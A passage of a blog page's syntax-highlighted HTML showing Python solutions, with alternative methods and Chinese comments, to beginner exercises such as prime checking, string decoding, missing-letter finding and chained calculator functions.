<span class=\"built_in\">len</span>(a) == <span class=\"number\">4</span>, x))</span><br><span class=\"line\">    <span class=\"comment\"># return [f for f in x if len(f) == 4]</span></span><br><span class=\"line\"></span><br><span class=\"line\">l1 = friend([<span class=\"string\">&quot;Ryan&quot;</span>, <span class=\"string\">&quot;Kieran&quot;</span>, <span class=\"string\">&quot;Jason&quot;</span>, <span class=\"string\">&quot;Yous&quot;</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(l1)</span><br><span class=\"line\">l1 = friend([<span class=\"string\">&quot;Ryan&quot;</span>, <span class=\"string\">&quot;Kieran&quot;</span>, <span class=\"string\">&quot;Mark&quot;</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(l1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;---------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">is_prime</span>(<span class=\"params\">num</span>):</span><br><span class=\"line\">    <span class=\"comment\"># if num &gt; 1:</span></span><br><span class=\"line\">    <span class=\"comment\">#     for i in range(2,num):</span></span><br><span class=\"line\">    <span class=\"comment\">#         if num % i == 0:</span></span><br><span class=\"line\">    <span class=\"comment\">#             return False</span></span><br><span class=\"line\">    <span class=\"comment\">#     else:</span></span><br><span class=\"line\">    <span class=\"comment\">#         return True</span></span><br><span class=\"line\">    <span class=\"comment\"># else:</span></span><br><span class=\"line\">    <span class=\"comment\">#     return False</span></span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    我们继续分析，其实质数还有一个特点，就是它总是等于 6x-1 或者 6x+1，其中 x 是大于等于1的自然数。</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    如何论证这个结论呢，其实不难。首先 6x 肯定不是质数，因为它能被 6 整除；其次 6x+2 肯定也不是质数，因为它还能被2整除；依次类推，6x+3 肯定能被 3 整除；6x+4 肯定能被 2 整除。那么，就只有 6x+1 和 6x+5 (即等同于6x-1) 可能是质数了。所以循环的步长可以设为 6，然后每次只判断 6 两侧的数即可。</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    :param num:</span></span><br><span class=\"line\"><span class=\"string\">    :return:</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># if num &lt;= 3:</span></span><br><span class=\"line\">    <span class=\"comment\">#     return num &gt; 1</span></span><br><span class=\"line\">    <span class=\"comment\"># # 不在6的倍数两侧的一定不是质数</span></span><br><span class=\"line\">    <span class=\"comment\"># if (num % 6 != 1 and num % 6 != 5):</span></span><br><span class=\"line\">    <span class=\"comment\">#     return False</span></span><br><span class=\"line\">    <span class=\"comment\"># sqrt = math.sqrt(num)</span></span><br><span class=\"line\">    <span class=\"comment\"># for i in range(5, int(sqrt+1), 6):</span></span><br><span class=\"line\">    <span class=\"comment\">#     if (num % i == 0 or num % (i + 2) == 0):</span></span><br><span class=\"line\">    <span class=\"comment\">#         return False</span></span><br><span class=\"line\">    <span class=\"comment\"># return True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> num &gt; <span class=\"number\">1</span> <span class=\"keyword\">and</span> <span class=\"built_in\">all</span>(num % i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>, <span class=\"built_in\">int</span>(num ** <span class=\"number\">.5</span> + <span class=\"number\">1</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># return True if ((num &gt; 1) and (num == 2 or num == 3 or (num % 2 != 0 and num % 3 != 0))) else False</span></span><br><span class=\"line\"></span><br><span class=\"line\">n1 = is_prime(<span class=\"number\">97</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(n1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;---------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find_it</span>(<span class=\"params\">seq</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> seq:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> seq.count(i) % <span class=\"number\">2</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># return [x for x in seq if seq.count(x) % 2][0]</span></span><br><span class=\"line\"></span><br><span class=\"line\">l1 = find_it([<span class=\"number\">20</span>,<span class=\"number\">1</span>,-<span class=\"number\">1</span>,<span class=\"number\">2</span>,-<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">4</span>,<span class=\"number\">20</span>,<span class=\"number\">4</span>,-<span class=\"number\">1</span>,-<span class=\"number\">2</span>,<span class=\"number\">5</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(l1)</span><br><span class=\"line\">l1 = find_it([<span class=\"number\">20</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">4</span>,<span class=\"number\">20</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(l1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;---------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">in_array</span>(<span class=\"params\">array1, array2</span>):</span><br><span class=\"line\">    <span class=\"comment\"># s1 = set()</span></span><br><span class=\"line\">    <span class=\"comment\"># for i in array1:</span></span><br><span class=\"line\">    <span class=\"comment\">#     for j in array2:</span></span><br><span class=\"line\">    <span class=\"comment\">#         if i in j:</span></span><br><span class=\"line\">    <span class=\"comment\">#             s1.add(i)</span></span><br><span class=\"line\">    <span class=\"comment\"># list1 = list(s1)</span></span><br><span class=\"line\">    <span class=\"comment\"># list1.sort()</span></span><br><span class=\"line\">    <span class=\"comment\"># return list1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">sorted</span>(&#123;sub <span class=\"keyword\">for</span> sub <span class=\"keyword\">in</span> array1 <span class=\"keyword\">if</span> <span class=\"built_in\">any</span>(sub <span class=\"keyword\">in</span> s <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> array2)&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">l1 = in_array([<span class=\"string\">&quot;arp&quot;</span>, <span class=\"string\">&quot;live&quot;</span>, <span class=\"string\">&quot;strong&quot;</span>], [<span class=\"string\">&quot;lively&quot;</span>, <span class=\"string\">&quot;alive&quot;</span>, <span class=\"string\">&quot;harp&quot;</span>, <span class=\"string\">&quot;sharp&quot;</span>, <span class=\"string\">&quot;armstrong&quot;</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(l1)</span><br><span class=\"line\">l2 = in_array([<span class=\"string\">&quot;tarp&quot;</span>, <span class=\"string\">&quot;mice&quot;</span>, <span class=\"string\">&quot;bull&quot;</span>], [<span class=\"string\">&quot;lively&quot;</span>, <span class=\"string\">&quot;alive&quot;</span>, <span class=\"string\">&quot;harp&quot;</span>, <span class=\"string\">&quot;sharp&quot;</span>, <span class=\"string\">&quot;armstrong&quot;</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(l2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;---------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">song_decoder</span>(<span class=\"params\">song</span>):</span><br><span class=\"line\">    list1 = song.split(<span class=\"string\">&#x27;WUB&#x27;</span>)</span><br><span class=\"line\">    l1 = <span class=\"built_in\">len</span>(list1)</span><br><span class=\"line\">    i = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> i &lt; l1:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(list1[i]) == <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"keyword\">del</span> list1[i]</span><br><span class=\"line\">            l1 -= <span class=\"number\">1</span></span><br><span class=\"line\">            i -= <span class=\"number\">1</span></span><br><span class=\"line\">        i += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    str1 = <span class=\"string\">&#x27; &#x27;</span>.join(list1)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> str1</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># return &quot; &quot;.join(song.replace(&#x27;WUB&#x27;, &#x27; &#x27;).split())</span></span><br><span class=\"line\">    <span class=\"comment\"># return &#x27; &#x27;.join([a for a in song.split(&#x27;WUB&#x27;) if a])</span></span><br><span class=\"line\"></span><br><span class=\"line\">s1 = song_decoder(<span class=\"string\">&quot;WUBWEWUBAREWUBWUBTHEWUBCHAMPIONSWUBMYWUBFRIENDWUB&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(s1)</span><br><span class=\"line\">s1 = song_decoder(<span class=\"string\">&quot;AWUBWUBWUBBWUBWUBWUBC&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(s1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;---------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find_even_index</span>(<span class=\"params\">arr</span>):</span><br><span class=\"line\">    <span class=\"comment\"># l1 = len(arr)</span></span><br><span class=\"line\">    <span class=\"comment\"># j = 1</span></span><br><span class=\"line\">    <span class=\"comment\"># if sum(arr[i] for i in range(1, l1)) == 0:</span></span><br><span class=\"line\">    <span class=\"comment\">#     return 0</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\"># while j &lt; l1:</span></span><br><span class=\"line\">    <span class=\"comment\">#     if sum(arr[i] for i in range(0, j)) == sum(arr[i] for i in range(j+1, l1)):</span></span><br><span class=\"line\">    <span class=\"comment\">#         return j</span></span><br><span class=\"line\">    <span class=\"comment\">#     j += 1</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\"># else:</span></span><br><span class=\"line\">    <span class=\"comment\">#     return -1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(arr)):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">sum</span>(arr[:i]) == <span class=\"built_in\">sum</span>(arr[i + <span class=\"number\">1</span>:]):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i</span><br><span class=\"line\">    <span class=\"keyword\">return</span> -<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">a1 = find_even_index([<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a1)</span><br><span class=\"line\">a1 = find_even_index(<span class=\"built_in\">list</span>(<span class=\"built_in\">range</span>(-<span class=\"number\">100</span>,-<span class=\"number\">1</span>)))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;---------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find_missing_letter</span>(<span class=\"params\">chars</span>):</span><br><span class=\"line\">    <span class=\"comment\"># arr = [chr(i) for i in range(ord(chars[0]), ord(chars[-1])+1)]</span></span><br><span class=\"line\">    <span class=\"comment\"># for j in arr:</span></span><br><span class=\"line\">    <span class=\"comment\">#     if j not in chars:</span></span><br><span class=\"line\">    <span class=\"comment\">#         return j</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> [<span class=\"built_in\">chr</span>(n) <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">ord</span>(chars[<span class=\"number\">0</span>]), <span class=\"built_in\">ord</span>(chars[-<span class=\"number\">1</span>]) + <span class=\"number\">1</span>) <span class=\"keyword\">if</span> n <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> [<span class=\"built_in\">ord</span>(c) <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> chars]][<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">a1 = find_missing_letter([<span class=\"string\">&quot;a&quot;</span>,<span class=\"string\">&quot;b&quot;</span>,<span class=\"string\">&quot;c&quot;</span>,<span class=\"string\">&quot;d&quot;</span>,<span class=\"string\">&quot;f&quot;</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a1)</span><br><span class=\"line\">a1 = find_missing_letter([<span class=\"string\">&quot;O&quot;</span>,<span class=\"string\">&quot;Q&quot;</span>,<span class=\"string\">&quot;R&quot;</span>,<span class=\"string\">&quot;S&quot;</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a1)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"p4\"><a href=\"#p4\" class=\"headerlink\" title=\"p4\"></a>p4</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 方法一：</span></span><br><span class=\"line\"><span class=\"comment\"># def zero(f = None): return 0 if not f else f(0)</span></span><br><span class=\"line\"><span class=\"comment\"># def one(f = None): return 1 if not f else f(1)</span></span><br><span class=\"line\"><span class=\"comment\"># def two(f = None): return 2 if not f else f(2)</span></span><br><span class=\"line\"><span class=\"comment\"># def three(f = None): return 3 if not f else f(3)</span></span><br><span class=\"line\"><span class=\"comment\"># def four(f = None): return 4 if not f else f(4)</span></span><br><span class=\"line\"><span class=\"comment\"># def five(f = None): return 5 if not f else f(5)</span></span><br><span class=\"line\"><span class=\"comment\"># def six(f = None): return 6 if not f else f(6)</span></span><br><span class=\"line\"><span class=\"comment\"># def seven(f = None): return 7 if not f else f(7)</span></span><br><span class=\"line\"><span class=\"comment\"># def eight(f = None): return 8 if not f else f(8)</span></span><br><span class=\"line\"><span class=\"comment\"># def nine(f = None): return 9 if not f else f(9)</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># def plus(y): return lambda x: x+y</span></span><br><span class=\"line\"><span class=\"comment\"># def minus(y): return lambda x: x-y</span></span><br><span class=\"line\"><span class=\"comment\"># def times(y): return lambda  x: x*y</span></span><br><span class=\"line\"><span class=\"comment\"># def divided_by(y): return lambda  x: x/y</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法二：</span></span><br><span class=\"line\"><span class=\"comment\"># def zero(arg=&quot;&quot;):  return eval(&quot;0&quot; + arg)</span></span><br><span class=\"line\"><span class=\"comment\"># def one(arg=&quot;&quot;):   return eval(&quot;1&quot; + arg)</span></span><br><span class=\"line\"><span class=\"comment\"># def two(arg=&quot;&quot;):   return eval(&quot;2&quot; + arg)</span></span><br><span class=\"line\"><span class=\"comment\"># def three(arg=&quot;&quot;): return eval(&quot;3&quot; + arg)</span></span><br><span class=\"line\"><span class=\"comment\"># def four(arg=&quot;&quot;):  return eval(&quot;4&quot; + arg)</span></span><br><span class=\"line\"><span class=\"comment\"># def five(arg=&quot;&quot;):  return eval(&quot;5&quot; + arg)</span></span><br><span class=\"line\"><span class=\"comment\"># def six(arg=&quot;&quot;):   return eval(&quot;6&quot; + arg)</span></span><br><span class=\"line\"><span class=\"comment\"># def seven(arg=&quot;&quot;): return eval(&quot;7&quot; + arg)</span></span><br><span class=\"line\"><span class=\"comment\"># def eight(arg=&quot;&quot;): return eval(&quot;8&quot; + arg)</span></span><br><span class=\"line\"><span class=\"comment\"># def nine(arg=&quot;&quot;):  return eval(&quot;9&quot; + arg)</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># def plus(n):    return &quot;+%s&quot; % n</span></span><br><span class=\"line\"><span class=\"comment\"># def minus(n):   return &quot;-%s&quot; % n</span></span><br><span class=\"line\"><span class=\"comment\"># def times(n):   return &quot;*%s&quot; % n</span></span><br><span class=\"line\"><span class=\"comment\"># def divided_by(n): return &quot;/%s&quot; % n</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法三：</span></span><br><span class=\"line\"></span><br><span class=\"line\">id_ = <span class=\"keyword\">lambda</span> x: x</span><br><span class=\"line\">number = <span class=\"keyword\">lambda</span> x: <span class=\"keyword\">lambda</span> f=id_: f(x)</span><br><span class=\"line\">zero, one, two, three, four, five, six, seven, eight, nine = <span class=\"built_in\">map</span>(number, <span class=\"built_in\">range</span>(<span class=\"number\">10</span>))</span><br><span class=\"line\">plus = <span class=\"keyword\">lambda</span> x: <span class=\"keyword\">lambda</span> y: y + x</span><br><span class=\"line\">minus = <span class=\"keyword\">lambda</span> x: <span class=\"keyword\">lambda</span> y: y - x</span><br><span class=\"line\">times = <span class=\"keyword\">lambda</span> x: <span class=\"keyword\">lambda</span> y: y * x</span><br><span class=\"line\">divided_by = <span class=\"keyword\">lambda</span> x: <span class=\"keyword\">lambda</span> y: y // x</span><br><span class=\"line\"></span><br><span class=\"line\">result = zero(plus(two()))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result)</span><br><span class=\"line\">result = one(times(five()))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;------------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法一</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># def sum_for_list(lst):</span></span><br><span class=\"line\"><span class=\"comment\">#     prime_num = []</span></span><br><span class=\"line\"><span class=\"comment\">#     l1 = []</span></span><br><span class=\"line\"><span class=\"comment\">#     for i in lst:</span></span><br><span class=\"line\"><span class=\"comment\">#         if i &lt; 0:</span></span><br><span class=\"line\"><span class=\"comment\">#             i = -i</span></span><br><span class=\"line\"><span class=\"comment\">#         &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#         一个正整数的质因数分解，每次得到一个质因数之后需要更新整数为：</span></span><br><span class=\"line\"><span class=\"comment\">#         原始整数除以这个质因数的值，循环直至原始整数的值小于2终止</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#         &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#         tmp = 2</span></span><br><span class=\"line\"><span class=\"comment\">#         if i == tmp:</span></span><br><span class=\"line\"><span class=\"comment\">#             prime_num.append(i)</span></span><br><span class=\"line\"><span class=\"comment\">#         else:</span></span><br><span class=\"line\"><span class=\"comment\">#             while (i &gt;= tmp):</span></span><br><span class=\"line\"><span class=\"comment\">#                 k = i % tmp</span></span><br><span class=\"line\"><span class=\"comment\">#                 if (k == 0) and (tmp not in prime_num) and (tmp &gt; 1 and all(tmp % k for k in range(2, int(tmp ** .5 + 1)))):</span></span><br><span class=\"line\"><span class=\"comment\">#                     prime_num.append(tmp)</span></span><br><span class=\"line\"><span class=\"comment\">#                     i = i / tmp  # 更新</span></span><br><span class=\"line\"><span class=\"comment\">#                 else:</span></span><br><span class=\"line\"><span class=\"comment\">#                     tmp = tmp + 1 #同时更新除数值，不必每次都从头开始</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     prime_num.sort()</span></span><br><span class=\"line\"><span class=\"comment\">#     for a in prime_num:</span></span><br><span class=\"line\"><span class=\"comment\">#         sum = 0</span></span><br><span class=\"line\"><span class=\"comment\">#         for b in lst:</span></span><br><span class=\"line\"><span class=\"comment\">#             if b % a == 0:</span></span><br><span class=\"line\"><span class=\"comment\">#                 sum += b</span></span><br><span class=\"line\"><span class=\"comment\">#         l1.append([a, sum])</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     return l1</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法二：</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> cffi.backend_ctypes <span class=\"keyword\">import</span> xrange</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sum_for_list</span>(<span class=\"params\">lst</span>):</span><br><span class=\"line\">    factors = &#123;i <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> lst <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">2</span>, <span class=\"built_in\">abs</span>(k)+<span class=\"number\">1</span>) <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> k % i&#125;</span><br><span class=\"line\">    prime_factors = &#123;i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> factors <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> [j <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> factors-&#123;i&#125; <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> i % j]&#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [[p, <span class=\"built_in\">sum</span>(e <span class=\"keyword\">for</span> e <span class=\"keyword\">in</span> lst <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> e % p)] <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> <span class=\"built_in\">sorted</span>(prime_factors)]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">result = sum_for_list([<span class=\"number\">15</span>, <span class=\"number\">30</span>, -<span class=\"number\">45</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result)</span><br><span class=\"line\">result = sum_for_list([<span class=\"number\">15</span>, <span class=\"number\">21</span>, <span class=\"number\">24</span>, <span class=\"number\">30</span>, <span class=\"number\">45</span>, <span class=\"number\">107</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;-------------------------------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">add</span>(<span class=\"title class_ inherited__\">int</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__call__</span>(<span class=\"params\">self,n</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> add(self+n)</span><br><span class=\"line\"></span><br><span class=\"line\">result = add(<span class=\"number\">2</span>)(<span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result(<span class=\"number\">5</span>))</span><br><span class=\"line\">at = add(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(at+<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(at(<span class=\"number\">4</span>)(<span class=\"number\">5</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;------------------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># def Fibonacci(m, signature):</span></span><br><span class=\"line\"><span class=\"comment\">#     index = 0</span></span><br><span class=\"line\"><span class=\"comment\">#     while len(signature) &lt; m:</span></span><br><span class=\"line\"><span class=\"comment\">#         v1 = signature[index]+signature[index+1]</span></span><br><span class=\"line\"><span class=\"comment\">#         signature.append(v1)</span></span><br><span class=\"line\"><span class=\"comment\">#         index += 1</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     return signature</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># def perimeter(n):</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     m = n+1</span></span><br><span class=\"line\"><span class=\"comment\">#     a1 = Fibonacci(m, [1, 1])</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     return sum(a1)*4</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法二：</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># def fib(n):</span></span><br><span class=\"line\"><span class=\"comment\">#     a, b = 0, 1</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     for i in range(n + 1):</span></span><br><span class=\"line\"><span class=\"comment\">#         if i == 0:</span></span><br><span class=\"line\"><span class=\"comment\">#             yield b</span></span><br><span class=\"line\"><span class=\"comment\">#         else:</span></span><br><span class=\"line\"><span class=\"comment\">#             a, b = b, a + b</span></span><br><span class=\"line\"><span class=\"comment\">#             yield b</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># def perimeter(n):</span></span><br><span class=\"line\"><span class=\"comment\">#     return sum(fib(n)) * 4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法三：</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">perimeter</span>(<span class=\"params\">n</span>):</span><br><span class=\"line\">    a, b = <span class=\"number\">1</span>, <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> n:</span><br><span class=\"line\">        a, b, n = b, a + b, n - <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">4</span> * (b - <span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p1 = perimeter(<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p1)</span><br><span class=\"line\">p1 = perimeter(<span class=\"number\">7</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p1)</span><br><span class=\"line\">p1 = perimeter(<span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p1)</span><br><span class=\"line\"><span class=\"comment\"># p1 = perimeter(52527)</span></span><br><span class=\"line\"><span class=\"comment\"># print(p1)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;------------------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">def cakes(recipe, available):</span></span><br><span class=\"line\"><span class=\"string\">    list1 = []</span></span><br><span class=\"line\"><span class=\"string\">    for key1, value1 in recipe.items():</span></span><br><span class=\"line\"><span class=\"string\">        if key1 in available:</span></span><br><span class=\"line\"><span class=\"string\">            list1.append(int(available[key1]/value1))</span></span><br><span class=\"line\"><span class=\"string\">        else:</span></span><br><span class=\"line\"><span class=\"string\">            return 0</span></span><br><span class=\"line\"><span class=\"string\">    return min(list1)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"># *** 方法二</span></span><br><span class=\"line\"><span class=\"string\">def cakes(recipe, available):</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27; Take each ingredient from the recipe, see if it is in the available ones</span></span><br><span class=\"line\"><span class=\"string\">        and calculate how many full cakes you can make with it.</span></span><br><span class=\"line\"><span class=\"string\">        If an ingredient is missing, we can&#x27;t bake a cake. Otherwise we have to</span></span><br><span class=\"line\"><span class=\"string\">        find the lowest possible amount of cakes.&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    return min([available[i]//recipe[i] if i in available else 0 for i in recipe])</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法三</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cakes</span>(<span class=\"params\">recipe, available</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">min</span>(available.get(k, <span class=\"number\">0</span>) // v <span class=\"keyword\">for</span> k,v <span class=\"keyword\">in</span> recipe.items())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">c1 = cakes(&#123;<span 